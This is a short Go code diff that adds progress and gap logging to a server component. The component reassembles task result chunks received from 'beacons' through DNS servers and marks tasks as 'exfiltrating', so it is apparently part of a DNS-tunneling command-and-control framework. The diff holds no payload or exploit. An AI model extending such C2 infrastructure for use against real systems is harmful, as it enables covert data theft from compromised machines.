@@ -896,6 +896,10 @@ func (d *MasterDatabase) SaveResultChunk(taskID, beaconID, dnsServerID string, c
 		return err
 	}
 
+	if chunkIndex > 0 && totalChunks > 1 {
+		fmt.Printf("[Master DB] Saved chunk %d/%d for task %s from %s\n", chunkIndex, totalChunks, taskID, dnsServerID)
+	}
+
 	// Update task status to "exfiltrating" when first chunk arrives (unless it's already completed)
 	if chunkIndex > 0 || (chunkIndex == 0 && totalChunks == 1) {
 		var currentStatus string
@@ -942,7 +946,7 @@ func (d *MasterDatabase) SaveResultChunk(taskID, beaconID, dnsServerID string, c
 			return err
 		}
 
-		fmt.Printf("[Master DB] Task %s progress: %d/%d chunks received\n", taskID, chunkCount, totalChunks)
+		fmt.Printf("[Master DB] Task %s progress: %d/%d chunks received (just received chunk %d)\n", taskID, chunkCount, totalChunks, chunkIndex)
 
 		if chunkCount == totalChunks {
 			// We have all chunks! Trigger reassembly in goroutine to avoid blocking other submissions
@@ -952,6 +956,13 @@ func (d *MasterDatabase) SaveResultChunk(taskID, beaconID, dnsServerID string, c
 			// This shouldn't happen but log if it does
 			fmt.Printf("[Master DB] ⚠️  Warning: Task %s has %d chunks but expected %d (duplicate chunks from load balancing?)\n",
 				taskID, chunkCount, totalChunks)
+		} else {
+			// Show chunk gaps if we're missing a lot
+			if totalChunks-chunkCount > 20 {
+				var minChunk, maxChunk int
+				d.db.QueryRow(`SELECT MIN(chunk_index), MAX(chunk_index) FROM task_results WHERE task_id = ? AND chunk_index > 0`, taskID).Scan(&minChunk, &maxChunk)
+				fmt.Printf("[Master DB] Task %s chunk range: %d-%d (missing %d chunks)\n", taskID, minChunk, maxChunk, totalChunks-chunkCount)
+			}
 		}
 	}
 
